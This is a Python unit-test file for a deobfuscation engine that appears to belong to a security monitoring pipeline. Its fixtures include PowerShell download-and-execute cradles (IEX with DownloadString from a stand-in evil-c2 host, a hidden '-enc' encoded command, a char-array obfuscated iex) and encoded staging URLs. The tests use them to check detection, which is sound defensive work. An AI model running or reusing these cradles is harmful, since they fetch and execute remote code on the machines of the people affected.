"""Unit tests for pipeline.deobfuscate — the deterministic decode engine.

Pure-stdlib module, so these tests have no DB/app dependencies.
"""

from __future__ import annotations

import base64
import gzip

from isoc_api.pipeline import deobfuscate


def _b64_utf16(s: str) -> str:
    return base64.b64encode(s.encode("utf-16-le")).decode()


def test_powershell_encodedcommand_surfaces_c2():
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil-c2.example.com/a.ps1')"
    cmd = f"powershell.exe -nop -w hidden -enc {_b64_utf16(payload)}"
    r = deobfuscate.analyze({"command_line": cmd}, "")
    assert r is not None
    assert len(r["artifacts"]) == 1
    art = r["artifacts"][0]
    assert art["encoding"] == "powershell-encodedcommand"
    assert "evil-c2.example.com" in art["decoded_text"]
    # decoded content carries malicious markers → score lifts into a real band
    assert r["obfuscation"]["score"] >= 0.4


def test_base64_gzip_chain():
    inner = b"http://stage2.bad.example/payload " * 4
    blob = base64.b64encode(gzip.compress(inner)).decode()
    r = deobfuscate.analyze({"message": f"data={blob}"}, "")
    assert r is not None
    encodings = {a["encoding"] for a in r["artifacts"]}
    assert "base64+gzip" in encodings
    assert "stage2.bad.example" in r["artifacts"][0]["decoded_text"]


def test_charcode_array_unrolls():
    script = 'iex (([char]104,[char]116,[char]116,[char]112) -join "")'
    r = deobfuscate.analyze({"script": script}, "")
    assert r is not None
    assert any(a["encoding"] == "char-array" for a in r["artifacts"])
    assert any("http" in a["decoded_text"] for a in r["artifacts"])


def test_benign_command_returns_none():
    r = deobfuscate.analyze({"command_line": "systeminfo.exe /fo csv"}, "user logged in")
    assert r is None


def test_hash_not_treated_as_hex_payload():
    # A bare SHA256 (64 hex) must NOT be decoded as a hex payload.
    sha = "a" * 64
    r = deobfuscate.analyze({"message": f"file hash {sha}"}, "")
    assert r is None or all(a["encoding"] != "hex" for a in r["artifacts"])


def test_scorer_orders_benign_below_obfuscated():
    benign = deobfuscate.obfuscation_score("Get-Process | Where-Object Name -eq lsass")
    obf = deobfuscate.obfuscation_score(
        "$x=[char]105+[char]101+[char]120;.($x) ((New-Object Net.WebClient).DownloadString('h'))"
    )
    assert obf > benign


def test_percent_encoding_decoded():
    r = deobfuscate.analyze({"message": "url=%68%74%74%70%3a%2f%2f%62%61%64%2e%63%6f%6d"}, "")
    assert r is not None
    assert any("bad.com" in a["decoded_text"] for a in r["artifacts"])


def test_recursive_depth_capped():
    # Nested base64 of base64 should decode multiple layers but stay bounded.
    inner = "http://nested.example/x"
    once = base64.b64encode(inner.encode()).decode()
    twice = base64.b64encode(once.encode()).decode()
    r = deobfuscate.analyze({"payload": twice}, "")
    assert r is not None
    # Should reach the inner URL through layered decoding.
    assert any("nested.example" in a["decoded_text"] for a in r["artifacts"])
